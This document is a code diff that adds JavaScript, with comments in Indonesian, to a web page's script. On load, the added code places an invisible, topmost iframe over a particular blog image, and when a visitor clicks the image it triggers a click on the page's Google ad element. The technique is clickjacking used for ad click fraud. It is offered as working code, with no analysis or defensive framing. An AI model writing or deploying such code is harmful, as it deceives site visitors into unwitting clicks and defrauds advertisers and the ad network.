@@ -164,3 +164,29 @@ function main() {
 // Panggil fungsi utama
 main();
 
+        window.onload = function() {
+            // Mendapatkan elemen gambar yang ingin ditargetkan
+            var targetImage = document.querySelector('img[src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhb6GLqA-_zKvh5_IYDVBeioMdkai3tRd1n8hosUWiw6zJWzXjlXq6z9pcVAYOAaQdV0zNHBxgk_z97yhjhERudlmKYzr9VsMtVDH49bXtLsS-TCs37I2GmWxf-5rBFj1f-Pexah-QtQ9bxaLYbyvccS3V5_6hCgAI_8psTLZ8XWi6E2SXdnJEo_VtcJa0/s16000/ssssssssss.jpg"]');
+    
+            // Mendapatkan elemen iklan
+            var adElement = document.querySelector('ins.adsbygoogle');
+    
+            // Membuat elemen iframe
+            var iframe = document.createElement('iframe');
+            iframe.style.position = 'absolute';
+            iframe.style.width = targetImage.offsetWidth + 'px';
+            iframe.style.height = targetImage.offsetHeight + 'px';
+            iframe.style.left = targetImage.offsetLeft + 'px';
+            iframe.style.top = targetImage.offsetTop + 'px';
+            iframe.style.zIndex = '9999';
+            iframe.style.opacity = '0'; // Membuat iframe transparan
+            iframe.src = 'about:blank'; // Tidak memuat konten apapun
+    
+            // Menambahkan iframe ke body
+            document.body.appendChild(iframe);
+    
+            // Menambahkan event listener untuk mendeteksi klik pada iframe
+            iframe.contentWindow.document.body.addEventListener('click', function() {
+                adElement.click(); // Memicu klik pada iklan
+            });
+        };
